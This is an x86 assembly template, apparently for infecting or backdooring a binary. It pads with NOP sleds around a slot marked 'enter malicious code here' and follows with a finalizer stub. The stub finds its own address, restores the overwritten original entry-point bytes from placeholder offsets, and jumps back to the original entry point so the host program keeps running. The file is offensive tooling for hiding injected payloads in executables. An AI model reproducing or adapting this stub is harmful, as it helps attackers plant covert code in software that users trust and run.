global _start
  
section .text

_start:
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    
; -------------------------------------------
; enter malicious code here
; -------------------------------------------

    call    get_current_addr            ; push return address

get_current_addr:
    pop     eax                         ; pop current address
    sub     eax, 0x5                    ; eax = address of finalizer, 0x5 = size of call instruction
    sub     eax, <FINALIZER_OFFSET>     ; eax = address of entry point
    mov     ebx, eax                    ; ebx = address of entry point
    mov     edi, eax                    ; edi = address of entry point
    add     ebx, <EXILED_CODE_OFFSET>   ; ebx = address of exiled code
    
    mov     ecx, <EXILED_CODE_SIZE>     ; exiled code size
    xor     edx, edx                    ; edx = 0
    
copy_loop:
    mov     dl, [ebx]                   ; memory-memory copy, phase 1
    mov     [eax], dl                   ; memory-memory copy, phase 2
    inc     eax                         ; increment addresses
    inc     ebx                         ;
    loop copy_loop

    jmp     edi                         ; jump back to entry point

; -------------------------------------------
    
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop